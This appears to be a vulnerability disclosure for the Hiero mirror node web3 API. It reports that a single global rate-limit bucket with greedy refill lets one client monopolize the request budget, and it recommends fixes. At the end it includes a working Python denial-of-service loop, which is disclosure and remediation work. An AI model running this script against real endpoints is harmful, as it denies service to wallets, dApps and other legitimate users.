### Title
Global Rate Limit Bucket Monopolization via Sawtooth Attack — No Per-IP Throttling

### Summary
The `rateLimitBucket()` bean in `ThrottleConfiguration.java` creates a single, process-wide Bucket4j token bucket shared across all clients. Because `refillGreedy(rateLimit, Duration.ofSeconds(1))` refills the full capacity in one second and no per-source tracking exists anywhere in the throttle stack, a single unprivileged attacker can consume the entire token budget in a burst, wait exactly one second for a full refill, and repeat indefinitely — monopolizing 100% of the global rate limit and denying service to all other users without ever triggering any anomaly detection.

### Finding Description

**Exact code path:**

`ThrottleConfiguration.java` lines 24–32 — a single global `Bucket` is constructed:
```java
Bucket rateLimitBucket() {
    long rateLimit = throttleProperties.getRequestsPerSecond(); // default: 500
    final var limit = Bandwidth.builder()
            .capacity(rateLimit)
            .refillGreedy(rateLimit, Duration.ofSeconds(1))
            .build();
    return Bucket.builder().addLimit(limit).build();
}
```

`ThrottleManagerImpl.java` lines 37–42 — every incoming request, regardless of source IP, consumes from this one shared bucket:
```java
public void throttle(ContractCallRequest request) {
    if (!rateLimitBucket.tryConsume(1)) {
        throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
    }
    ...
}
```

**Root cause:** The failed assumption is that the global 500 req/s budget will be shared fairly across many clients. In reality, there is no per-IP, per-connection, or per-identity sub-bucket. The `refillGreedy` strategy continuously accumulates tokens, so after exactly 1 second the bucket is fully restored to `capacity`. An attacker who times their bursts to the refill period sustains the theoretical maximum throughput from a single source.

**Exploit flow:**
1. Attacker sends 500 HTTP requests as fast as possible (burst drains all tokens).
2. Attacker sleeps for 1 second (bucket fully refills via `refillGreedy`).
3. Attacker repeats steps 1–2 indefinitely.

**Why checks fail:**
- `LoggingFilter` only logs `request.getRemoteAddr()` — no blocking or counting per IP.
- `MetricsFilter` records byte sizes — no rate tracking per source.
- `ThrottleManagerImpl` has no IP-keyed bucket map; it calls `rateLimitBucket.tryConsume(1)` on the single shared bean.
- No Spring Security, no servlet filter, and no infrastructure-level (e.g., nginx) rate limiting is configured in this codebase.
- `ThrottleProperties.request[]` filters are content-based (field/expression matching), not source-based, and default to `List.of()` (empty).

### Impact Explanation
A single attacker with a scripted HTTP client can hold the entire 500 req/s global budget indefinitely. All other legitimate callers receive `429`-equivalent `ThrottleException` responses for the duration of the attack. Because the web3 API is the EVM-compatible JSON-RPC surface for the Hiero mirror node, sustained denial of this endpoint prevents dApps, wallets, and tooling from querying contract state, estimating gas, or executing read-only calls — effectively taking the mirror node's web3 interface offline for all users while the attacker is active. The gas-limit bucket (`gasLimitBucket`) is subject to the identical design flaw.

### Likelihood Explanation
No special privileges, credentials, or network position are required. Any external user with a basic HTTP client (curl loop, Python `requests`, etc.) can execute this attack. The 1-second timing is trivially achievable with `time.sleep(1)` or equivalent. The attack is fully repeatable, stateless, and requires no prior knowledge of the system beyond the public endpoint URL. The default `requestsPerSecond = 500` is high enough that a single modern machine can saturate it in a single burst.

### Recommendation
1. **Per-IP token buckets**: Replace the single shared `Bucket` with a `CaffeineCache`- or `Guava`-backed `LoadingCache<String, Bucket>` keyed on client IP (extracted from `X-Forwarded-For` / `RemoteAddr`), so each source gets its own sub-budget.
2. **Reduce burst capacity relative to refill**: Use `refillIntervally` instead of `refillGreedy`, or set `capacity` to a fraction of `rateLimit` (e.g., `capacity = rateLimit / 10`) to prevent full-second burst accumulation.
3. **Add infrastructure-level rate limiting**: Deploy an ingress-layer rate limiter (nginx `limit_req`, AWS WAF, Cloudflare) as a defense-in-depth measure that operates before the JVM.
4. **Anomaly detection**: Emit a metric or log a warning when a single IP consumes more than a configurable percentage of the global budget within a window.

### Proof of Concept
```python
import requests, time, threading

TARGET = "http://<mirror-node-host>/api/v1/contracts/call"
PAYLOAD = {"data": "0x", "to": "0x0000000000000000000000000000000000000001", "gas": 21000}

def burst(n=500):
    for _ in range(n):
        requests.post(TARGET, json=PAYLOAD)

while True:
    # Step 1: drain the entire global bucket in one burst
    t = threading.Thread(target=burst)
    t.start(); t.join()
    # Step 2: wait for full refill (refillGreedy restores all 500 tokens in 1s)
    time.sleep(1.0)
    # All legitimate users receive ThrottleException during the burst window
```

Running this loop from a single machine monopolizes 100% of the `rateLimitBucket` capacity indefinitely. Legitimate concurrent callers will observe consistent `429`/throttle errors for the entire duration.
